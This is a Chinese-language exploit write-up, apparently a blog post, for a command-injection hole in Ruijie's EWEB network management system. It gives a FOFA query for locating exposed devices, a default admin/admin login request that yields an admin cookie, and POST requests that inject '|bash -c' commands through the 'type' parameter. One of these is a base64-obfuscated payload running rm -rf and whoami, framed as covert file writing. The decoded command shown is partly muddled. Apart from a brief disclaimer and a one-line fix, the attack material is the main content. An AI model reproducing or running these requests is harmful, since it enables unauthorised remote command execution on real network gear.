[toc]

# 免责声明
该文章只为学习和交流，请不要做违法乱纪的事情，如有与本人无关

# 漏洞描述
锐捷网管系统是由北京锐捷数据时代科技有限公司开发的新一代基于云的网络管理软件，以"数据时代创新网管与信息安全"为口号，定位于终端安全、IT运营及企业服务化管理统一解决方案。
# 漏洞原理
在该系统的/flow_control_pi/flwo.control.php的文件中存在命令执行参数
# 影响版本
不详

# fofa

app="Ruijie-EWEB网管系统"

# 漏洞复现
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/a954b52b60294e60b8c27996fff1e9d6.png)
用post请求访问/ddi/server/login.php页面并提交admin参数可以获得管理员的cookie
```yaml
POST /ddi/server/login.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

username=admin&password=admin?
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/4bde599b28da4be1a3b7c87040499937.png)
使用cookie向/flow_control_pi/flwo.control.php?a=getFlowGroup 提交type参数
```yaml
POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Cookie:  RUIJIEID=q6g97tqc32rl4bl8h89gjub031; user=admin;
Accept-Encoding: gzip
Connection: close

type=|bash+-c+'ping+-c+4+ip'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/15a65ac1a3e745b3bcae74959ca3cf02.png)

可以隐藏写入文件

%7Cbash+-c+%27echo+cm0gLXJmIC4uL2EudHh0ICYmIHJtIC1yZiAuLi9hLnR4dCAmJiB3aG9hbWkgPiAuLi9hLnR4dCAyPiYxID4gLi4vYS50eHQgMj4mMQ%3D%3D+%7C+base64+-d+%7C+bash+%26%26+exit+0%27



```bash
|bash -c 'echo rm -rf ../a.txt && rm -rf ../a.txt && whoami > ../a.txt 2>&1 > ../a.txt 2>&1 | base64 -d | bash && exit 0'
```



# 修复建议
升级到最新版本
